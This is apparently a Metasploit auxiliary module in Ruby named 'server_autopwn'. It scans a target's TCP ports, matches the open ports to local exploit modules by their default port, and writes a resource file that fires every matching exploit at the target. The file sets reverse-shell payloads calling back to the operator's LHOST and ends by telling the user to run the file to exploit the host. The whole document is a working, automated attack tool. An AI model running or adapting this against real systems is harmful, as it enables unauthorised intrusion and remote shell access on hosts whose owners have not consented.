##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/base/sessions/scriptable'
require 'msf/base'
require 'msf/core'
class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner
  include Msf::Session::Interactive
  include Msf::Session::Scriptable

  if File.file?("./msfexec.rc") 
    File.delete("./msfexec.rc")
  end

  $handler = 2000
  def initialize
    super(
      'Name'        => 'server_autopwn',
      'Description' => %q{
        Enumerates open TCP ports, cross references them with metasploit
        modules using the same default port, then builds a metasploit .rc
        file to be used against the host.
      },
      'Author'      => [ 'oxagast', 'Marshall Whittaker' ],
      'License'     => MSF_LICENSE
    )
    register_options(
      [
        OptString.new('PORTS', [true, "Ports to scan (e.g. 22-25,80,110-900)", "1-10000"]),
        OptInt.new('TIMEOUT', [true, "The socket connect timeout in milliseconds", 1000]),
        OptInt.new('CONCURRENCY', [true, "The number of concurrent ports to check per host", 10]),
        OptInt.new('DELAY', [true, "The delay between connections, per thread, in milliseconds", 0]),
        OptInt.new('JITTER', [true, "The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.", 0]),
        OptString.new('RHOSTS', [true, "The Target's ip"]),
        OptString.new('LHOST', [true, "Local machine to connect back to"]),
        OptString.new('LPATH', [true, "Local path to grep metasploit exploit modules (ends in modules/exploits !)", "./modules/exploits"]),
        OptString.new('ARCH', [true, "Processor architecture of the target.", "x64"])
      ])

      deregister_options('RPORT')

 
          end
    def run_host(ip)
      timeout = datastore['TIMEOUT'].to_i
      ports = Rex::Socket.portspec_crack(datastore['PORTS'])
        if File.file?("./msfexec.rc")
          File.delete("./msfexec.rc")
        end
        open('msfexec.rc', 'a') { |f|
          f.puts("back")
          f.puts("set RHOSTS #{datastore['RHOSTS']}")
          f.puts("set LHOST #{datastore['LHOST']}")
          f.puts("set ExitOnSession false")
        }

      if ports.empty?
        raise Msf::OptionValidateError.new(['PORTS'])
      end

      jitter_value = datastore['JITTER'].to_i
      if jitter_value < 0
        raise Msf::OptionValidateError.new(['JITTER'])
      end

      delay_value = datastore['DELAY'].to_i
      if delay_value < 0
        raise Msf::OptionValidateError.new(['DELAY'])
      end
      # Add the delay based on JITTER and DELAY if needs be
      while(ports.length > 0)
        t = []
        r = []
        opentcp = []
        begin
          1.upto(datastore['CONCURRENCY']) do
            this_port = ports.shift
            break if not this_port
            t << framework.threads.spawn("Module(#{self.refname})-#{ip}:#{this_port}", false, this_port) do |port|
              begin
                # Add the delay based on JITTER and DELAY if needs be
                add_delay_jitter(delay_value,jitter_value)

                # Actually perform the TCP connection
                s = connect(false,
                  {
                    'RPORT' => port,
                    'RHOST' => ip,
                    'ConnectTimeout' => (timeout / 1000.0)
                  }
                )
                if s
                  print_good("#{ip}:#{port} - TCP")
                  r << [ip,port,"open"]
                  opentcp << port
                end
              rescue ::Rex::ConnectionRefused
                vprint_status("#{ip}:#{port} - TCP closed")
              rescue ::Rex::ConnectionError, ::IOError, ::Timeout::Error
              rescue ::Rex::Post::Meterpreter::RequestError
              rescue ::Interrupt
                raise $!
              rescue ::Exception => e
                print_error("#{ip}:#{port} exception #{e.class} #{e} #{e.backtrace}")
                ensure
                if s
                  disconnect(s) rescue nil
                end
              end
            end
          end
          t.each {|x| x.join }
        rescue ::Timeout::Error
          ensure
          t.each {|x| x.kill rescue nil }
        end
        r.each do |res|
          report_service(:host => res[0], :port => res[1], :state => res[2])
        end
        # generic shell backup
        $payl = "generic_shell_reverse"
        # use port scanning to build script here
        for openport in opentcp do
          msfmodules = []
          # find modules  and loop over them
          msfmodules = Find.find(datastore['LPATH']).select { |p| /.*\.rb$/ =~ p }
          for mod in msfmodules do
            if  File.open(mod).grep(/\(#{openport}\)/) do
                open('msfexec.rc', 'a') { |m|
                mod = mod.gsub(/.*exploits\//, "exploits/")  
                m.puts("use #{mod}")
                print_good("Adding exploit: #{mod}")
                m.puts("set LPORT #{$handler}")
                # try to guess the payload shell from the current exploit
                if mod["linux"] 
                  payl = "linux/#{datastore['ARCH']}/shell_reverse_tcp"
                end 
                if mod["windows"]
                  payl = "windows/#{datastore['ARCH']}/shell/reverse_tcp"
                end   
                if mod["freebsd"]
                  payl = "bsd/#{datastore['ARCH']}/shell/reverse_tcp"
                end                                                                
                if mod["osx"]
                  payl = "osx/#{datastore['ARCH']}/shell_reverse_tcp"
                end
                if mod["android"]
                  payl = "android/shell/reverse_tcp"
                end
                if mod["aix"]
                  payl = "aix/ppc/shell_reverse_tcp"
                end
                if mod["solaris"]
                  payl = "solaris/#{datastore['ARCH']}/shell_reverse_tcp"
                end
                m.puts("set payload #{payl}")
                # sleep fixes some parallelism bugs
                m.puts("sleep 0.08")
                m.puts("exploit -j -z")
                m.puts("back")
              }
              # increment the handler so that its on a different LPORT
              $handler = $handler + 1
           end
          end
        end
      end
    end
    # kill jobs and then list sessions
    open('msfexec.rc', 'a') { |f|
      f.puts("jobs -K")
      f.puts("sessions")
    }
    # run it!
    print_good("Now run 'resource msfexec.rc' to exploit #{datastore['RHOSTS']}")
  end
end
